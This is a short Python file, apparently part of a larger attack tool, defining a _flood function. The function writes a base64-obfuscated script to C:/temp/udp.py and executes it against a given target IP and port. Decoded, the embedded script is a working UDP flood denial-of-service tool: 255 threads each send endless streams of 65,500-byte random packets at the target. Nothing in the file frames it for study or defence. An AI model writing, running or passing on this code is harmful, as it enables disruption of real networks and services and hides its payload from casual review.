import base64,os

def _flood(alvo,porta):
    with open('C:/temp/udp.py','w') as filee:
        filee.write(base64.b64decode('''
    aW1wb3J0IHNvY2tldCxzeXMKZnJvbSByYW5kb20gaW1wb3J0IF91cmFuZG9tCmZyb20gdGhy
    ZWFkaW5nIGltcG9ydCBUaHJlYWQKZnJvbSB0aW1lIGltcG9ydCBzbGVlcAoKdHJ5OgogICAg 
    VEFSR0VUID0gc3lzLmFyZ3ZbMV0KICAgIFBPUlQgPSBzeXMuYXJndlsyXQpleGNlcHQ6CiAg
    ICBzeXMuZXhpdCgwKQoKZGVmIGF0dGFjayhUQVJHRVQsUE9SVCk6CiAgICBzb2NrID0gc29j
    a2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICB3aGls
    ZSBUcnVlOgogICAgICAgIHByaW50ICcuJwogICAgICAgIGJ5dGVzcyA9IF91cmFuZG9tKDY1
    NTAwKQogICAgICAgIHNvY2suc2VuZHRvKGJ5dGVzcywgKFRBUkdFVCxQT1JUKSkKCmRlZiBf
    Zmxvb2QoKToKICAgIGdsb2JhbCBUQVJHRVQsUE9SVAogICAgZm9yIGkgaW4gcmFuZ2UoMCwy
    NTUpOgogICAgICAgIFRocmVhZCh0YXJnZXQ9YXR0YWNrLGFyZ3M9KFRBUkdFVCxpbnQoUE9S
    VCkpKS5zdGFydCgpCgpfZmxvb2QoKQ==
    '''))
    filee.close()
    os.system('C:/temp/udp.py {} {}'.format(alvo,porta))